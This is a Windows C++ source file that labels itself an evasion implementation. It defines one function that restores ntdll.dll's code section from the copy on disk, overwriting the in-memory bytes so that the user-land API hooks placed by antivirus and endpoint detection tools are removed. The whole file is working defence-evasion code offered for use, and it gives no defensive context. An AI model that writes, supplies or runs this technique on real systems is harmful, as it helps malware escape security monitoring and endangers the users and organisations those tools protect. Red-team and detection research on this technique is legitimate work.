#include <windows.h>
#include <winternl.h>

// Evasion Native Implementation
// Bypasses user-land API hooks by unhooking ntdll.dll from disk.

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

bool UnhookNtdll() {
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return false;
    }

    LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + dosHeader->e_lfanew);
    
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * sizeof(IMAGE_SECTION_HEADER)));
        
        if (strcmp((char*)sectionHeader->Name, ".text") == 0) {
            DWORD oldProtect = 0;
            PVOID baseAddress = (PVOID)((DWORD_PTR)hNtdll + sectionHeader->VirtualAddress);
            SIZE_T regionSize = sectionHeader->Misc.VirtualSize;
            
            pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
            if (!NtProtectVirtualMemory) break;
            
            NtProtectVirtualMemory(GetCurrentProcess(), &baseAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            
            memcpy(baseAddress, (LPVOID)((DWORD_PTR)pMapping + sectionHeader->VirtualAddress), sectionHeader->Misc.VirtualSize);
            
            NtProtectVirtualMemory(GetCurrentProcess(), &baseAddress, &regionSize, oldProtect, &oldProtect);
            break;
        }
    }

    UnmapViewOfFile(pMapping);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return true;
}
